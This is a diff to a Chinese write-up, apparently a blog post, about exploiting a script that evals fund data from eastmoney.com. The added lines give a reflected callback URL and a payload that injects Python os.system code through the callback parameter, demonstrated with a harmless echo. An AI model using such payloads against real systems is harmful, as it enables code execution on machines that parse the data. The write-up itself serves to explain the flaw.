@@ -125,10 +125,16 @@ l = l.replace("null", "None")
 最后我想构造一个xss，想让网站返回想要的结果，也失败了
 
 经过半天的找寻，终于发现一个回调函数接口有问题，请求错误回调函数名称时，响应中正好会包含该错误的函数名称. 正好能满足我们的需求:发送错误数据，并让该网站返回我们想要的结果，即返回数据可控  
-回调函数接口如下
+该回调函数接口如下
+```url
+http://fund.eastmoney.com/pingzhongdata/gaoduan/PinzhongRightApi.aspx?fc=AF5097&callback=jQuery183037745026472073073_ Data_netWorthTrend=[需要返回的错误数据]&_=1688890155531#
 ```
-http://fund.eastmoney.com/pingzhongdata/../gaoduan/PinzhongRightApi.aspx?fc=AF5097&callback=jQuery183037745026472073073_ Data_netWorthTrend=[需要返回的错误数据]&_=1688890155531#
+
+于是，我们根据该接口，构造出payload
 ```
+../gaoduan/PinzhongRightApi.aspx?fc=AF5097&callback=jQuery183037745026472073073_ Data_netWorthTrend = __import__('os').system('echo 成功触发'); &_=1688890155531#
+```
+
 最后，正则成功捕获到该数据并正确处理，最后成功eval
 
 # [](#header-1)0x03、结果
